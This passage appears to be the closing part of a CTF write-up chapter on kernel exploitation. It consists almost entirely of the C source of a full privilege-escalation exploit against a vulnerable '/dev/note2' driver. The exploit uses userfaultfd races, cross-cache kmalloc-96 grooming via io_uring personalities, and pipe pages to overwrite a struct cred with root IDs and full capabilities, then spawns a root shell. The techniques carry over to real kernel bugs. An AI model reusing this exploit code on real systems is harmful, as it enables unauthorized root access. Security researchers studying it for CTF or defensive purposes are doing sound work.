
static struct cross_cache *kmalloc96_cc;
size_t n_queues;

struct kernel_cred {
    uint32_t usage;
    uint32_t uid;
    uint32_t gid;
    uint32_t suid;
    uint32_t sgid;
    uint32_t euid;
    uint32_t egid;
    uint32_t fsuid;
    uint32_t fsgid;
    uint32_t securebits;
    uint64_t cap_inheritable;
    uint64_t cap_permitted;
    uint64_t cap_effective;
    uint64_t cap_bset;
    uint64_t cap_ambient;
    /* ... not relevant*/
};

struct pipe_pair {
    union {
        struct {
            int read;
            int write;
        };
        int __raw[2];
    };
};

struct user_cap_data_struct {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
};

/* cross-cache stuff */

static inline int64_t cc_allocate(struct cross_cache *cc,
                                  int64_t *repo,
                                  uint32_t to_alloc)
{
    for (uint32_t i = 0; i < to_alloc; i++)
    {
        int64_t ref = cc->allocate();
        if (ref == -1)
            return -1;
        repo[i] = ref;
    }
    return 0;
}

static inline int64_t cc_free(struct cross_cache *cc,
                              int64_t *repo,
                              uint32_t to_free,
                              bool per_slab)
{
    for (uint32_t i = 0; i < to_free; i++)
    {
        if (per_slab && (i % (cc->objs_per_slab - 1) == 0))
            continue;
        else
        {
            if (repo[i] == -1)
                continue;
            cc->free(repo[i]);
            repo[i] = -1;
        }
    }
    return 0;
}

/*
 * Reserve enough objects to later overflow the per-cpu partial list */
static inline int64_t reserve_partial_list_amount(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_allocate(cc, cc->overflow_objs, to_alloc);
    return 0;
}

static inline int64_t allocate_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab - 1;
    cc_allocate(cc, cc->pre_victim_objs, to_alloc);
    return 0;
}

static inline int64_t fill_victim_page(struct cross_cache *cc)
{
    uint32_t to_alloc = cc->objs_per_slab + 1;
    cc_allocate(cc, cc->post_victim_objs, to_alloc);
    return 0;
}

static inline int64_t empty_victim_page(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab - 1;
    cc_free(cc, cc->pre_victim_objs, to_free, false);
    to_free = cc->objs_per_slab + 1;
    cc_free(cc, cc->post_victim_objs, to_free, false);
    return 0;
}

static inline int64_t overflow_partial_list(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    cc_free(cc, cc->overflow_objs, to_free, true);
    return 0;
}

static inline int64_t free_all(struct cross_cache *cc)
{
    uint32_t to_free = cc->objs_per_slab * (cc->cpu_partial + 1);
    cc_free(cc, cc->overflow_objs, to_free, false);
    empty_victim_page(cc);

    return 0;
}

int64_t cc_next(struct cross_cache *cc)
{
    switch (cc->phase++)
    {
    case CC_RESERVE_PARTIAL_LIST:
        return reserve_partial_list_amount(cc);
    case CC_ALLOC_VICTIM_PAGE:
        return allocate_victim_page(cc);
    case CC_FILL_VICTIM_PAGE:
        return fill_victim_page(cc);
    case CC_EMPTY_VICTIM_PAGE:
        return empty_victim_page(cc);
    case CC_OVERFLOW_PARTIAL_LIST:
        return overflow_partial_list(cc);
    default:
        return 0;
    }
}

void cc_deinit(struct cross_cache *cc)
{
    free_all(cc);
    free(cc->overflow_objs);
    free(cc->pre_victim_objs);
    free(cc->post_victim_objs);
    free(cc);
}

struct cross_cache *cc_init(uint32_t objs_per_slab,
                            uint32_t cpu_partial,
                            void *allocate_fptr,
                            void *free_fptr)
{
    struct cross_cache *cc = malloc(sizeof(struct cross_cache));
    if (!cc)
    {
        perror("init_cross_cache:malloc\n");
        return NULL;
    }
    cc->objs_per_slab = objs_per_slab;
    cc->cpu_partial = cpu_partial;
    cc->free = free_fptr;
    cc->allocate = allocate_fptr;
    cc->phase = CC_RESERVE_PARTIAL_LIST;

    uint32_t n_overflow = objs_per_slab * (cpu_partial + 1) * CC_OVERFLOW_FACTOR;
    uint32_t n_previctim = objs_per_slab - 1;
    uint32_t n_postvictim = objs_per_slab + 1;

    cc->overflow_objs = malloc(sizeof(int64_t) * n_overflow);
    cc->pre_victim_objs = malloc(sizeof(int64_t) * n_previctim);
    cc->post_victim_objs = malloc(sizeof(int64_t) * n_postvictim);

    return cc;
}

static inline int pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    return sched_setaffinity(0, sizeof cpuset, &cpuset);
}

static int rlimit_increase(int rlimit)
{
    struct rlimit r;
    if (getrlimit(rlimit, &r))
        fatal("rlimit_increase:getrlimit");

    if (r.rlim_max <= r.rlim_cur)
    {
        printf("[+] rlimit %d remains at %.lld", rlimit, r.rlim_cur);
        return 0;
    }
    r.rlim_cur = r.rlim_max;
    int res;
    if (res = setrlimit(rlimit, &r))
        fatal("rlimit_increase:setrlimit");
    else
        printf("[+] rlimit %d increased to %lld", rlimit, r.rlim_max);
    return res;
}

static void note_add(const void *data, size_t size)
{
    struct ioctl_arg arg = {
        .addr = (uint64_t)data,
        .size = size,
    };

    if (ioctl(note_fd, IO_ADD, &arg) != 0)
    {
        fatal("add");
    }
}

static void note_edit(int idx, const void *data)
{
    struct ioctl_arg arg = {
        .idx = idx,
        .addr = (uint64_t)data,
    };

    if (ioctl(note_fd, IO_EDIT, &arg) != 0)
    {
        fatal("edit");
    }
}

static void note_show(int idx, void *data)
{
    struct ioctl_arg arg = {
        .idx = idx,
        .addr = (uint64_t)data,
    };

    if (ioctl(note_fd, IO_SHOW, &arg) < 0)
    {
        fatal("show");
    }
}

static void note_del(int idx)
{
    struct ioctl_arg arg = {
        .idx = idx,
    };

    if (ioctl(note_fd, IO_DEL, &arg) < 0)
    {
        fatal("del");
    }
}

static void *thread_note_edit(void *addr)
{
    pin_cpu(0);
    note_edit(0, addr);
    puts("[+] note_edit() succeeded");
}

static int ufd_unblock_page_copy(void *unblock_page, void *content_page, size_t *copy_out)
{
    struct uffdio_copy copy = {
        .dst = (uintptr_t)unblock_page,
        .src = (uintptr_t)content_page,
        .len = 0x1000,
        .copy = (uintptr_t)copy_out,
        .mode = 0};

    printf("unblocking %p (copying 0x1000 bytes from %p)", unblock_page, content_page);
    if (ioctl(userfault_fd, UFFDIO_COPY, &copy))
        fatal("UFFDIO_COPY failed");
    return 0;
}

static int sys_io_uring_setup(size_t entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}


static int uring_create(size_t n_sqe, size_t n_cqe)
{
    struct io_uring_params p = {
        .cq_entries = n_cqe,
        .flags = IORING_SETUP_CQSIZE
    };

    int res = sys_io_uring_setup(n_sqe, &p);
    if (res < 0)
        fatal("io_uring_setup() failed");
    return res;
}

static int alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* increment refcount so we don't free it afterwards*/
        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}

static void *userfault_thread(void *arg)
{
    struct uffd_msg blockers[2];
    struct uffd_msg msg;
    struct uffdio_copy copy;

    uint64_t *scratch = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    pin_cpu(0);

    for (size_t i = 0; i < 2; i++)
    {
        if (read(userfault_fd, &msg, sizeof(msg)) != sizeof(msg))
        {
            fatal("userfault read");
        }
        else if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            fatal("unexpected uffd event");
        }

        printf("[+] got userfault block %ld (addr %.16llx)\n", i, msg.arg.pagefault.address);
        blockers[i] = msg;
    }


    struct pipe_pair pipes[16];
    for (size_t i = 0; i < ARRAY_SIZE(pipes); i++)
        pipe(pipes[i].__raw);

    int uring_cred_dumps[2] = {uring_create(0x80, 0x100), uring_create(0x80, 0x100)};

    cc_next(kmalloc96_cc); /* free surrounding objects*/
    cc_next(kmalloc96_cc); /* fill up partial lists */

    /* sleep for rcu*/
    usleep(200000);

    note_del(0);
    note_add("aaa", 2);

    /* Reallocate freed kmalloc-96 slab as a pipe page. */
    uint64_t dummy_buf[0x1000 / 8] = {};
    for (size_t i = 0; i < ARRAY_SIZE(pipes); i++)
        if (write(pipes[i].write, dummy_buf, 0x1000) < 0)
            fatal("write() to pipe failed");

    /* unblock to trigger memcpy(). */
    size_t copied_size = 0;
    ufd_unblock_page_copy((void *)blockers[0].arg.pagefault.address, scratch, &copied_size);

    usleep(200000);
    uint64_t cookie = 0, cookie_idx = 0;
    size_t pipe_idx;
    for (pipe_idx = 0; pipe_idx < ARRAY_SIZE(pipes); pipe_idx++) {
        /* kmalloc-96 is not naturally aligned to PAGESIZE, so we can read this all without worrying
         * about prematurely freeing our page. */
        for (size_t i = 0; i < 42; i++) {
            uint64_t chunk[0x0c];

            if (read(pipes[pipe_idx].read, &chunk, 96) <= 0)
                fatal("read() from pipe failed");

            uint64_t potential_cookie = chunk[0];

            printf("%.16lx\n", potential_cookie);
            if (!cookie && potential_cookie) {
                cookie = potential_cookie;
                cookie_idx = i;
            }
        }

        if (cookie) {
            break;
        }
    }

    if (cookie) {

        /* If we didn't land on a cred boundary, bail out. We'd crash anyway. */
        if ((cookie_idx * 96) % 192 != 0) {
            /* make the memcpy() just write into our controlled pipe page again, so no harm is done. */
            ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);
            fatal("UaF object was not aligned to 192 bytes. Try again..");
        }

        /* Before releasing the page again, we empty the cred freelist 
         * so any new cred allocations will get a new slab */
        alloc_n_creds(uring_cred_dumps[0], 0x4000);

        /* Release page*/
        close(pipes[pipe_idx].read);
        close(pipes[pipe_idx].write);
    } else {
        /* this error path is a bit problematic, we don't know where the write went.. 
         * still, it's better to get the other write over with now.
        */
        ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);
        fatal("cross-cache failed. Try again..");
    }

    printf("pipe %ld, offset +0x%.4lx: cookie %.16lx\n", pipe_idx, cookie_idx * 96, cookie);

    /* Pre-allocate struct creds to reclaim the page. 
     * Free them immediately afterwards so we can reallocate them for tasks. */
    alloc_n_creds(uring_cred_dumps[1], 32);
    close(uring_cred_dumps[1]);

    /* wait for rcu to finish so creds are actually freed. */
    usleep(200000);

    struct pipe_pair child_comm;
    pipe(child_comm.__raw);

    /* realloc creds, now belong to child tasks */
    for (size_t i = 0; i < 32 * 2; i++) {
        
        if (fork())
            continue;
        
        sleep(2);
        uid_t uid = getuid();
        printf("uid: %d\n", uid);
        if (!uid) {
            char dummy[8];
            write(child_comm.write, &dummy, sizeof dummy);
            system("sh");
        }

        exit(0);
        
    }

    sleep(1);

    struct kernel_cred *cred = (void*)scratch;

    cred->usage = 1;
    cred->uid = cred->euid = cred->fsuid = 0;
    cred->gid = cred->egid = cred->fsgid = 0;
    cred->securebits = 0; /* SECUREBITS_DEFAULT */
    cred->cap_effective = cred->cap_permitted = cred->cap_inheritable = cred->cap_bset = 0x1fffffffful;
    cred->cap_ambient = 0;

    for (size_t i = 0; i < 96 / 8; i++)
        scratch[i] ^= cookie;

    ufd_unblock_page_copy((void *)blockers[1].arg.pagefault.address, scratch, &copied_size);

    struct pollfd poller[] = { {.events = POLLIN, .fd = child_comm.read}};

    if (poll(poller, 1, 3000) != 1)
        fatal("Could not overwrite struct cred. Try again..");

    sleep(10000);
    return NULL;
}

// Initialize userfaultfd. Must call this before using the other userfault_*
// functions.
static void userfaultfd_init()
{
    for (size_t i = 0; i < 2; i++)
    {
        userfault_fd = syscall(SYS_userfaultfd, O_CLOEXEC);
        if (userfault_fd < 0)
        {
            fatal("userfaultfd");
        }

        userfault_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (userfault_page == MAP_FAILED)
        {
            fatal("mmap userfaultfd");
        }

        // Enable userfaultfd
        struct uffdio_api api = {
            .api = UFFD_API,
            .features = 0,
        };
        if (ioctl(userfault_fd, UFFDIO_API, &api) < 0)
        {
            fatal("ioctl(UFFDIO_API)");
        }
    }

    pthread_create(&userfault_pthread, NULL, userfault_thread, NULL);

    puts("userfaultfd initialized");
}

// Register a region with userfaultfd and make it inaccessible. The region must
// be page-aligned and the size must be a multiple of the page size.
static void userfaultfd_register(void *addr, size_t len)
{
    assert(((uintptr_t)addr % 0x1000) == 0);
    assert(len >= 0x1000 && len % 0x1000 == 0);

    struct uffdio_register reg = {
        .range = {
            .start = (uintptr_t)addr,
            .len = len,
        },
        .mode = UFFDIO_REGISTER_MODE_MISSING,
    };
    if (ioctl(userfault_fd, UFFDIO_REGISTER, &reg) < 0)
    {
        fatal("ioctl(UFFDIO_REGISTER)");
    }
}

#define OBJS_PER_SLAB 32
#define CPU_PARTIAL 30


int uring_spray_fd;

static int64_t cc_alloc_kmalloc96()
{
    /* This will allocate a io uring identity in kmalloc-96. It can be repeated an arbitrary amount of times for a single uring instance. */
    int res = syscall(SYS_io_uring_register, uring_spray_fd, IORING_REGISTER_PERSONALITY, 0, 0);
    if (res < 0)
        fatal("alloc: io_uring_register() failed");
    
    return res;
}

static void cc_free_kmalloc96(int64_t personality)
{
    if (syscall(SYS_io_uring_register, uring_spray_fd, IORING_UNREGISTER_PERSONALITY, 0, personality) < 0)
        fatal("free: io_uring_register() failed");
}

int main(void)
{
    pthread_t edit_thread;

    pin_cpu(0);
    rlimit_increase(RLIMIT_NOFILE);

    if ((note_fd = open("/dev/note2", O_RDWR)) < 0)
        fatal("Failed to open note fd");

    /* Free any remaining notes from a previous attempt. */
    for (size_t i = 0; i < 0x10; i++) {
        struct ioctl_arg arg = { .idx = i};
        ioctl(note_fd, IO_DEL, &arg);
    }


    userfaultfd_init();

    uint8_t *mem = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
    {
        fatal("mmap fault memory");
    }

    uring_spray_fd = uring_create(0x80, 0x100);
    kmalloc96_cc = cc_init(OBJS_PER_SLAB, CPU_PARTIAL, cc_alloc_kmalloc96, cc_free_kmalloc96);

    userfaultfd_register(mem + 0x1000, 0x2000);

    /* allocate a bunch of kmalloc96 objects, so the next one we allocate will fall into our "victim page" */
    cc_next(kmalloc96_cc);
    cc_next(kmalloc96_cc);
    note_add(mem, 96);

    /* also fill up the victim page */
    cc_next(kmalloc96_cc);

    pthread_create(&edit_thread, NULL, thread_note_edit, mem + 0x1000);
    usleep(20000);
    note_edit(0, mem + 0x2000);
    puts("done");
    sleep(1000000);
}
```

## Table of Contents

- [Prologue](./fourchain-prologue): Introduction
- [Chapter 1: Hole](./fourchain-hole): Using the "hole" to pwn the V8 heap and some delicious Swiss cheese.
- [Chapter 2: Sandbox](./fourchain-sandbox): Pwning the Chrome Sandbox using `Sandbox`.
- **[Chapter 3: Kernel](./fourchain-kernel) (You are here)**
- [Chapter 4: Hypervisor](./fourchain-hv): Lord of the MMIO: A Journey to IEM
- [Chapter 5: One for All](./fourchain-fullchain): Uncheesing a Challenge and GUI Troubles
- [Epilogue](./fourchain-epilogue): Closing thoughts
